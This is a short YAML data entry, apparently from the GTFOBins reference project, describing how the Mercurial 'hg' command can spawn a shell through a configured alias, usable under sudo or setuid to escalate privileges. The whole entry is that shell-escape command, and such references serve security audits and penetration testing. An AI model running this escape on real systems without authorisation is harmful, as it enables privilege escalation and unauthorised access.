<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/hg -->
---
functions:
  shell:
  - code: |-
      hg --config alias.x='!/bin/sh' x
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
